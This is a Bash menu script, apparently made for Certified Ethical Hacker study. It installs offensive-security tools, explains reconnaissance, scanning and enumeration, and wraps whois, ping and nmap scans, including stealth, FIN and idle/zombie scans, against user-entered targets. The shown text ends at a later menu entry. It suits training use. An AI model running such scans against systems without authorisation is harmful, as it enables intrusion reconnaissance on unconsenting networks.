#!/bin/bash
clear
echo -e "\033[1m \e[91m"
figlet "                                                            CEH";sleep 0.20
if type figlet > /dev/null; then
        echo -e "\e[33m--> figlet \e[31m[+]";sleep 0.20
    else
        apt-get install figlet
    fi
if type python > /dev/null; then
        echo  -e "\e[33m--> python \e[31m[+]";sleep 0.20
    else
        apt-get install python
    fi
if type python3 > /dev/null; then
        echo -e "\e[33m--> python3 \e[31m[+]";sleep 0.20
    else
        apt-get install python3
    fi
if type  whois > /dev/null; then
        echo -e "\e[33m--> whois \e[31m[+]";sleep 0.20
    else
        apt-get install whois
    fi
if type recon-ng > /dev/null; then
        echo -e "\e[33m--> recon-ng \e[31m[+]";sleep 0.20
    else
        apt-get install recon-ng
    fi
if type nslookup > /dev/null; then
        echo -e "\e[33m--> nslookup \e[31m[+]";sleep 0.20
    else
        apt-get install nslookup
    fi
if type  nmap > /dev/null; then
        echo -e "\e[33m--> nmap \e[31m[+]";sleep 0.20
    else
        apt-get install nmap
    fi
if type hping3 > /dev/null; then
        echo -e "\e[33m--> hping3 \e[31m[+]";sleep 0.20
    else
        apt-get install hping3
    fi
if type zenmap > /dev/null; then
        echo -e "\e[33m--> zenmap \e[31m[+]";sleep 0.20
    else
        apt-get install zenmap
    fi
if type lbd > /dev/null; then
        echo -e "\e[33m--> lbd \e[31m[+]";sleep 0.20
    else
        apt-get install lbd
    fi
if type theharvester > /dev/null; then
        echo -e "\e[33m--> theharvester \e[31m[+]";sleep 0.20
    else
        apt-get install theharvester
    fi
if type urlcrazy > /dev/null; then
        echo -e "\e[33m--> urlcrazy \e[31m[+]";sleep 0.20
    else
        apt-get install urlcrazy
    fi
if type dnsmap > /dev/null; then
        echo -e "\e[33m--> dnsmap \e[31m[+]";sleep 0.20
    else
        apt-get install figlet
    fi
if type msfconsole > /dev/null; then
        echo -e "\e[33m--> msfconsole \e[31m[+]";sleep 0.20
    else
        apt-get install msfconsole
    fi
if type hydra > /dev/null; then
        echo -e "\e[33m--> hydra \e[31m[+]";sleep 0.20
    else
        apt-get install hydra
    fi
if type crunch > /dev/null; then
        echo -e "\e[33m--> crunch \e[31m[+]";sleep 0.20
    else
        apt-get install crunch
    fi
if type setoolkit > /dev/null; then
        echo -e "\e[33m--> setoolkit \e[31m[+]";sleep 0.20
    else
        apt-get install setoolkit
    fi
if type john > /dev/null; then
        echo -e "\e[33m--> john \e[31m[+]";sleep 0.20
    else
        apt-get install john
    fi
if type msfvenom > /dev/null; then
        echo -e "\e[33m--> msfvenom \e[31m[+]";sleep 0.20
    else
        apt-get install msfvenom
    fi
if type tshark > /dev/null; then
        echo -e "\e[33m--> wireshark \e[31m[+]";sleep 0.20
    else
        apt-get install wireshark
    fi
if type arpspoof > /dev/null; then
        echo -e "\e[33m--> arpspoof \e[31m[+]";sleep 0.20
    else
        apt-get install arpspoof
    fi
if type macchanger > /dev/null; then
        echo -e "\e[33m--> macchanger \e[31m[+]";sleep 0.20
    else
        apt-get install macchanger
    fi
if type hping3 > /dev/null; then
        echo -e "\e[33m--> hping3 \e[31m[+]";sleep 0.20
    else
        apt-get install hping3
    fi
if type hamster > /dev/null; then
        echo -e "\e[33m--> hamster \e[31m[+]";sleep 0.20
    else
        apt-get install hamster
    fi
if type sslstrip > /dev/null; then
        echo -e "\e[33m--> sslstrip \e[31m[+]";sleep 0.20
    else
        apt-get install hping3
    fi
if type ferret > /dev/null; then
        echo -e "\e[33m--> ferret \e[31m[+]";sleep 0.20
    else
        apt-get install ferret
    fi
if type sqlmap > /dev/null; then
        echo -e "\e[33m--> sqlmap \e[31m[+]";sleep 0.20
    else
        apt-get install sqlmap
    fi
if type dirb > /dev/null; then
        echo -e "\e[33m--> dirb \e[31m[+]";sleep 0.20
    else
        apt-get install dirb
    fi
if type searchsploit > /dev/null; then
        echo -e "\e[33m--> searchsploit \e[31m[+]";sleep 0.20
    else
        apt-get install searchsploit
    fi
if type nikto > /dev/null; then
        echo -e "\e[33m--> nikto \e[31m[+]";sleep 0.20
    else
        apt-get install nikto
    fi
if type wpscan > /dev/null; then
        echo -e "\e[33m--> wpscan \e[31m[+]";sleep 0.20
    else
        apt-get install wpscan
    fi
if type airodump-ng > /dev/null; then
        echo -e "\e[33m--> airodump-ng \e[31m[+]";sleep 0.20
    else
        apt-get install airodump-ng
    fi
if type airodump-ng > /dev/null; then
        echo -e "\e[33m--> airodump-ng \e[31m[+]";sleep 0.20
    else
        apt-get install airodump-ng
    fi
if type airmon-ng > /dev/null; then
        echo -e "\e[33m--> airmon-ng \e[31m[+]";sleep 0.20
    else
        apt-get install airmon-ng
    fi
if type aircrack-ng > /dev/null; then
        echo -e "\e[33m--> aircrack-ng \e[31m[+]";sleep 0.20
    else
        apt-get install aircrack-ng
    fi
if type aireplay-ng > /dev/null; then
        echo -e "\e[33m--> aireplay-ng \e[31m[+]";sleep 0.20
    else
        apt-get install aireplay-ng
    fi
if type kismet > /dev/null; then
        echo -e "\e[33m--> kismet \e[31m[+]";sleep 0.20
    else
        apt-get install kismet
    fi
main_menu()
{
clear
echo -e "\033[1m \e[91m"
figlet "                                                            CEH";sleep 0.15
echo -e "\033[1m \e[32m"               
echo "  "
echo -e  "\e[97m====================================================================================================================================";sleep 0.10
echo "  "
echo -e "\e[32m                                                           ******* MAIN MENU ******** ";sleep 0.15
echo "  "
echo -e "\e[33m 1.FOOTPRINTING & RECONNAISSANCE";sleep 0.10
echo " 2.SCANNING ";sleep 0.10
echo " 3.ENUMERATION ";sleep 0.10
echo " 4.SYSTEM HACKING ";sleep 0.10
echo " 5.MALWARE THREATS ";sleep 0.10
echo " 6.SNIFFING ";sleep 0.10
echo " 7.SOCIAL ENNGINEERING";sleep 0.10
echo " 8.DENIAL OF SERVICE";sleep 0.10
echo " 9.SESSION HIJACKING ";sleep 0.10
echo " 10.HACKING WEBSERVERS ";sleep 0.10
echo " 11.HACKING WEB APPLICATION ";sleep 0.10
echo " 12.SQL INJECTION ";sleep 0.10
echo " 13.WIRELESS HACKING ";sleep 0.10
echo " 14.MOBILE HACKING ";sleep 0.10
echo " 15.FIREWALLS,HONEYPOTS & EVADING IDS ";sleep 0.10
echo " 16.IOT HACKING ";sleep 0.10
echo " 17.CLOUD COMPUTING ";sleep 0.10
echo " 18.CRYPTOGRAPHY ";sleep 0.10
echo " 19.EXIT";sleep 0.10
echo " ";sleep 0.10
echo "ENTER CHOICE := ";sleep 0.10
read x
}
main_menu
clear
while true :
do
case $x in
	1) echo "===================================================================================================================================="
	   echo -e "\e[32m                          *** FOOTPRINTING & RECONNAISSANCE ***";echo "  ";sleep 0.10 
	   echo -e "\e[33m1.ABOUT RECONNAISSANCE";sleep 0.10
	   echo "2.ABOUT FOOTPRINTING ";sleep 0.10
	   echo "3.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mReconnaissance attacks begin with a scan of the network from the infected endpoint to locate the asset and services an attacker wants to target. Varieties of reconnaissance include active, random IP as well as stealth scanning. 
following the seven steps listed below −
Gather initial information,Determine the network randomly,Identify active machines,Discover open ports and access points,Fingerprint the operating system,Uncover services on ports and Map the network
Reconnaissance takes place in two parts − Active Reconnaissance and Passive Reconnaissance.
           	    Active Reconnaissance-
		    In this process, you will directly interact with the computer system to gain information. This information 	
can be relevant and  accurate.
        	    Passive Reconnaissance-
                     In this process, you will not be directly connected to a computer system. This process is used to gather essential information without ever interacting with the target systems.

Links:-
https://en.wikipedia.org/wiki/Footprinting
https://securitytrails.com/blog/top-20-intel-tools
https://www.youtube.com/watch?v=FU8tIz_kRWw";sleep 0.10;;
	   2) echo -e "\e[33mFootprinting is a part of reconnaissance process which is used for gathering possible information 1.ABOUT a target computer system or network. Footprinting could be both passive and active. Reviewing a company’s website is an example of passive footprinting, whereas attempting to gain access to sensitive information through social engineering is an example of active information gathering.
Footprinting is basically the first step where hacker gathers as much information as possible to find ways to intrude into a target system or at least decide what type of attacks will be more suitable for the target.
During this phase, a hacker can collect the following information −
Domain name,IP Addresses,Namespaces,Employee information,Phone numbers,E-mails and Job Information

Links:-
https://www.tutorialspoint.com/ethical_hacking/ethical_hacking_footprinting.html
http://www.cybersecurityacademy.com/Certified-Ethical-Hacker.html
";sleep 0.10 ;;
	   3) clear
	      echo "====================================================================================================================================";sleep 0.10
	      echo -e "\e[33m1.WHOIS";sleep 0.10
	      echo "2.RECON-NG";sleep 0.10
	      echo "3.NSLOOKUP";sleep 0.10
	      echo "4.PING";sleep 0.10
	      echo "5.TRACEROUTE";sleep 0.10
	      echo "6.ARCHIVE.ORG";sleep 0.10
  	      echo "7.ROBTOX";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10	  		
	      read x
	      clear
	      case $x in
	      1) clear
		 echo "===================================================================================================================================="
		 echo -e "\e[33m1.ABOUT";sleep 0.10
	         echo "2.USE";echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man whois;;
		 2) clear
		    echo "===================================================================================================================================="
		    echo -e "\e[33m1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       whois $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       whois $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 esac ;;
	      2) clear
		 echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10; echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man recon-ng;;
		 2) clear
		    echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Workspace to create:=";sleep 0.10
		       read y
		       recon-ng -w $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       recon-ng $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 esac ;;
	      3) clear
		 echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man nslookup;;
		 2) clear
		    echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter HOST/SERVER Name:=";sleep 0.10
		       read y
		       nslookup $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       nslookup $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 esac ;;
	      4) clear
		 echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10; echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man ping;;
		 2) clear
		    echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    clear
		    case $q in
 		    1) echo "Enter Domain Name/IP ADDRESS TO PING:=";sleep 0.10
		       read a
		       echo "Enter Type Of IP Protocol(-4->IPV4 / -6 -> IPV6) ";sleep 0.10
		       read b
		       echo "Enter Number Of Counts";sleep 0.10
		       read c
		       ping $b -c $c $a;;
		    2) echo "Enter Your Fields( Enter -f for flood pings)";sleep 0.10
		       read l
		       ping $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 esac ;;
	      5) clear
		 echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10; echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man traceroute;;
		 2) clear
	            echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    clear
		    case $q in
 		    1) echo "Enter Domain Name/IP ADDRESS:=";sleep 0.10
		       read a
		       echo "Enter Type Of IP Protocol(-4->IPV4 / -6 -> IPV6) ";sleep 0.10
		       read b
		       echo "Enter Packet Length ";sleep 0.10
		       read c
		       traceroute $b $a $c ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       traceroute $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 esac ;;
	     6)  clear
		 echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z
		 clear	
		 case $z in
		 1) echo -e "\e[33mThe Internet Archive, a 501(c)(3) non-profit, is building a digital library of Internet sites and other cultural artifacts in digital form. Like a paper library, we provide free access to researchers, historians, scholars, the print disabled, and the general public. Our mission is to provide Universal Access to All Knowledge.
";sleep 0.10;;
		 2) echo -e "\e[91mVISIT --> https://www.archive.org"
		 esac ;;
	     7)  clear
		 echo "===================================================================================================================================="
      		 echo -e "\e[33m1.ABOUT";sleep 0.10
	         echo "2.USE";echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) echo -e "\e[33mWhat is Robtex used for?
Robtex is used for various kinds of research of IP numbers, Domain names, etc
Are you a normal IT guy doing data forensics, investigating competitors, tracking spammers or hackers or a virus, or just curious? No matter what, this should be the first place to go
";sleep 0.10;;
		 2) echo -e "\e[33mVISIT -> https://www.robtex.com ";sleep 0.10 ;;
		 esac ;;
	     0) main_menu
		clear
	      continue ;;
	    esac ;;
	   0) main_menu
	      clear
	      continue ;;
	   esac ;;
	2) echo -"===================================================================================================================================="
	   echo -e "\e[32m 				*** SCANNING *** ";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mNetwork scanning is a procedure for identifying active hosts on a network, either for the purpose of attacking them or for network security assessment. Scanning procedures, such as ping sweeps and port scans, return information about which IP addresses map to live hosts that are active on the Internet and what services they offer. Another scanning method, inverse mapping, returns information about what IP addresses do not map to live hosts; this enables an attacker to make assumptions about viable addresses. 

Links:-
https://searchsecurity.techtarget.com/definition/denial-of-service
https://www.secureworks.com/blog/scanning-for-vulnerabilities-when-why-and-how-often
https://www.techopedia.com/definition/16124/network-scanning
https://searchsecurity.techtarget.com/definition/vulnerability-scanning
https://www.lynda.com/Linux-tutorials/Ethical...Scanning-Networks/476619-2.html
https://www.linkedin.com/.../cybersecurity-for-it.../introduction-to-vulnerability-scannin...
";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.NMAP";sleep 0.10
	      echo "2.HPING3";sleep 0.10
	      echo "3.ZENMAP";sleep 0.10
	      echo "4.ANGRY IP SCANNER";sleep 0.10
	      echo "5.LBD";sleep 0.10
	      echo "6.THEHARVESTER";sleep 0.10
	      echo "7.URLCRAZY";sleep 0.10
	      echo "8.DNSDIT6";sleep 0.10
	      echo "9.DNSMAP";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man nmap;;
		 2) clear
		    echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    clear
		    case $q in
 		    1) echo "===================================================================================================================================="
		       echo "1.TCP CONNECT / FULL OPEN SCAN ";sleep 0.10
		       echo "2.SYN STEALTH / HALF OPEN SCAN ";sleep 0.10
		       echo "3.UDP SCAN";sleep 0.10
		       echo "4.FIN STEALTH SCAN";sleep 0.10
		       echo "5.PING SCAN";sleep 0.10
		       echo "6.IDLE SCAN / ZOMBIE SCAN ";sleep 0.10
		       echo "7.VERSION SCAN";sleep 0.10
		       echo "8.OS DETECTION";sleep 0.10
		       echo "0.GO BACK TO MAIN MENU";sleep 0.10
		       read a 
		       clear
		       case $a in 
		       1)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 case $b in
			 1) echo -e "\e[33mA TCP connect requires a full TCP connection to be established and therefore is a slower scan. Ignoring discovery is often required as many firewalls or hosts will not respond to PING, so could be missed unless you select the -Pn parameter. Of course this can make scan times much longer as you could end up sending scan probes to hosts that are not there.
";sleep 0.10;;
			 2) echo -e "\e[33mENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			    sudo nmap -sT $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       2)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 case $b in
			 1) echo -e "\e[33mSYN scan is the default and most popular scan option for good reasons. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by restrictive firewalls. It is also relatively unobtrusive and stealthy since it never completes TCP connections. SYN scan works against any compliant TCP stack rather than depending on idiosyncrasies of specific platforms as Nmap's FIN/NULL/Xmas, Maimon and idle scans do. It also allows clear, reliable differentiation between the open, closed, and filtered states.";sleep 0.10;;
			 2) echo -e "\e[33mENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			    sudo nmap -sS $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       3)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 case $b in
			 1) echo -e "\e[33mThis scan checks to see if there are any UDP ports listening. Since UDP does not respond with a positive acknowledgment like TCP and only responds to an incoming UDP packet when the port is closed, this type of scan can sometimes show false positives. However, it can also reveal Trojan horses running on high UDP ports and hidden RPC services";;
			 2) echo -e "\e[33mENTER IP ADDRESS / DOMAIN NAME"
			    read c
			    sudo nmap -sU $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       4)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 case $b in
			 1) echo -e "\e[33mThe FIN scan sends a packet with only the FIN flag set, the Xmas Tree scan sets the FIN, URG and PUSH flags (see a good TCP/IP book for more details) and the Null scan sends a packet with no flags switched on.These scan types will work against any system where the TCP/IP implementation follows RFC 793. Microsoft Windows does not follow the RFC, and will ignore these packets even on closed ports. This technicality allows you to detect an MS Windows system by running SYN along with one of these scans. If the SYN scan shows open ports, and the FIN/NUL/XMAS does not, chances are you’re looking at a Windows box ";;
			 2) echo -e "\e[33mENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			    sudo nmap -sF $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       5)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 case $b in
			 1) echo -e "\e[33mIt is used to find whether host is alive or not. if user doesnot have admin privelage then connect call is being 					  used";;
			 2) echo -e "\e[33mENTER IP ADDRESS / DOMAIN NAME"
			    read c
		            sudo nmap -sP $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       6)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 case $b in
			 1) echo -e "\e[33mIdle scanning is an advanced, highly stealthed technique, where no packets are sent to the target which can be identified to originate from the scanning machine. A zombie host (and optionally port) must be specified for this scan type. The zombie host must satisfy certain criteria essential to the workings of this scan.";;
			 2) echo -e "\e[33mENTER ZOMBIE IP ADDRESS / DOMAIN NAME"
			    read c
			    echo "ENTER HOST IP ADDRESS / DOMAIN NAME"
			    read d
			    sudo nmap -sI $c $d;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       7)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 case $b in
			 1) echo -e "\e[33mVersion detection is the techique to find the service running on the host with its version";;
			 2) echo -e "\e[33mENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			    sudo nmap -sV $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       8)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 case $b in
			 1) echo -e "\e[33mscan used to find os type running on host. it has database of os nameed nmap-os-db";;
			 2) echo "ENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			   sudo nmap -O $c;;
			 0) main_menu
			    clear
			    continue ;;
			 esac ;;
		       0) main_menu
			  clear 
			  continue ;;
			esac ;;
		    2) echo -e "\e[33mEnter Your Fields";sleep 0.10
		       read l
		       nmap $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      	    continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man hping3;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       hping3 $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       hping3 $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
	         0) main_menu
	      continue ;;		
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man zenmap;;
		 2) zenmap ;;
		 0) main_menu
		      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) echo "angryipscanner";;
		 2) echo "download -> ";; 		 
	         0) main_menu
	      continue ;;
		 esac ;;
	      5) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) lbd;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       lbd $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       lbd $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      6) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) theharvester;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name to search:=";sleep 0.10
		       read a
		       echo "Enter Data source:=";sleep 0.10
		       read b
		       echo "Enter limit for number of result:=";sleep 0.10
		       read c
		       echo "Enter start of result number:=";sleep 0.10
		       read d
		       theharvester -d $a -l $c -b $b -s $d ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       theharvester $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      7) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man urlcrazy;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter URL:=";sleep 0.10
		       read y
		       urlcrazy $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       urlcrazy $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      8) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man dnsdict6;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       dnsdict6 $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       dnsdict6 $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      9) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man dnsmap;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       dnsmap $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       dnsmap $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	    esac;;
	   0) main_menu 
	      continue ;;
	   esac ;;
	3) echo "===================================================================================================================================="
	   echo -e "\e[32m				*** ENUMERATION *** ";echo "  ";sleep 0.10
	   echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mEnumeration belongs to the first phase of Ethical Hacking, i.e., “Information Gathering”. This is a process where the attacker establishes an active connection with the victim and try to discover as much attack vectors as possible, which can be used to exploit the systems further.
		    Enumeration can be used to gain information on −
		    1.Network shares
	   	    2.SNMP data, if they are not secured properly
		    3.IP tables
		    4.Usernames of different systems
		    5.Passwords policies lists
		    Enumerations depend on the services that the systems offer. They can be −
		    1.DNS enumeration
	            2.NTP enumeration
		    3.SNMP enumeration
		    4.Linux/Windows enumeration
	 	    5.SMB enumeration.

Links:-What is Enumeration? - InfoSec Resources - InfoSec Institute
https://www.greycampus.com/opencampus/ethical-hacking/enumeration-and-its-types
https://ilabs.eccouncil.org › Ethical Hacking Exercises › Enumeration VMs
https://www.linkedin.com/learning/ethical...enumeration/enumerating-host-services
https://www.linkedin.com/learning/ethical-hacking-enumeration
";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.DNSENUM";sleep 0.10
	      echo "2.DNSRECON";sleep 0.10
	      echo "3.NIKTO";sleep 0.10
	      echo "4.ENUM4LINUX";sleep 0.10
	      echo "5.SMTP-USER-ENUM";sleep 0.10
	      echo "6.SSLSTRIP";sleep 0.10
	      echo "7.ARMITAGE";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man dnsenum;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       dnsenum $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       dnsenum $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z
		 clear	
		 case $z in
		 1) man dnsrecon;;
		 2) echo "===================================================================================================================================="
